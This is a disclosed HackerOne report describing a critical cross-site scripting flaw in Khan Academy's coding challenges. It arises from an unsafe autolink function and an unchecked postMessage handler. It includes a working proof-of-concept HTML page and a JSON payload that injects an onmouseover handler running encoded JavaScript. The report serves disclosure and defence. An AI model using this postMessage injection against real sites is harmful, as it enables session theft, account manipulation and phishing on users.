# xss due to incorrect handling of postmessages

## Report Details
- **Report ID**: 1758132
- **URL**: https://hackerone.com/reports/1758132
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2022-11-01T23:12:11.302Z
- **Disclosed**: 2022-12-23T00:22:55.455Z

## Reporter
- **Username**: moom825
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: khanacademy

## Vulnerability Information
Due to Insecure handling of create link tags (a tags) in a function called `autolink` found in `7Bmt.af733e428f9f986dfc96.js`
```js
e = n.autolink(e, !0));
        const n = function() {
            const e = /\b(?:(?:https?:\/\/|www\d{0,3}[.]|[a-z0-9.\-]+[.][a-z]{2,4}\/)(?:[^\s()<>&]+|&amp;|\((?:[^\s()<>]|(?:\([^\s()<>]+\)))*\))+(?:\((?:[^\s()<>]|(?:\([^\s()<>]+\)))*\)|[^\s`!()\[\]{};:'".,<>?«»“”‘’&]))/gi;
            return {
                autolink: function(t, r) {
                    return t.replace(e, (function(e) {
                        /^https?:\/\//.test(e) || (e = "http://" + e);
                        return "<a " + (r ? 'rel="nofollow"' : "") + ' href="' + e + '">' + e + "</a>"
                    }
                    ))
                }
            }
        }();
```
which is ran in the challenges (ex: https://www.khanacademy.org/computing/computer-programming/programming/resizing-with-variables/pc/challenge-brown-bear-eyes). A specially crafted postmessage can abuse this.
```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>New webpage</title>
    </head>
    <body>
        <script>
        function main()
{
	window['test']=window.open("https://www.khanacademy.org/computing/computer-programming/programming/interactive-programs/pc/challenge-mouse-movement-mania");
	const pwntimer = setTimeout(pwn, 3000);	
}
function pwn(){window['test'].postMessage('{"results":{"timestamp":'+Date.now()+',"code":"","errors":[],"assertions":[],"warnings":[],"tests":[{"name":"","state":"pass","results":[{"type":"assertion","msg":"http://#/\\"style=\\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\\"onmouseover=\\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\\"","state":"pass","expected":"","meta":{"structure":"function() {pwned!}"}}]}]}}',"*");clearTimeout(pwntimer)};
        </script>
        <button onclick="main();">press to pwn</button>
    </body>
</html>
```
also due to insecure host checking in the `message` event, the mentioned html code above can be run from any webpage.

The payload which the function `autolink` is insecurely creating the tag can look like this
`http://#/"style="width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;"onmouseover="eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))"` the malicious link will be set incorrectly and create extra attributes (in this case style and onmouseover)


the parsed json payload:
```json
{
   "results":{
      "timestamp":"",
      "code":"",
      "errors":[
         
      ],
      "assertions":[
         
      ],
      "warnings":[
         
      ],
      "tests":[
         {
            "name":"",
            "state":"pass",
            "results":[
               {
                  "type":"assertion",
                  "msg":"http://#/\"style=\"width:2000px;height:2000px;position:fixed;top:0;left:0;margin-bottom:2000;z-index:200;\"onmouseover=\"eval(String.fromCharCode(97,108,101,114,116,40,34,112,119,110,100,33,34,41))\"",
                  "state":"pass",
                  "expected":"",
                  "meta":{
                     "structure":"function() {pwned!}"
                  }
               }
            ]
         }
      ]
   }
}
```

## Impact

This attack could be steal user data (cookies, profile, etc) which in turn can be used to manipulate the user account, if it is a teacher who gets targeted, it can cause havoc with the email ("106 assignments have been assigned") as well as leak student private info. This attack could also be used to create a phishing page with the domain `khanacademy.org` by modifying the page to display a login box (stealing the users email and password).

## Attachments
- poc.mp4
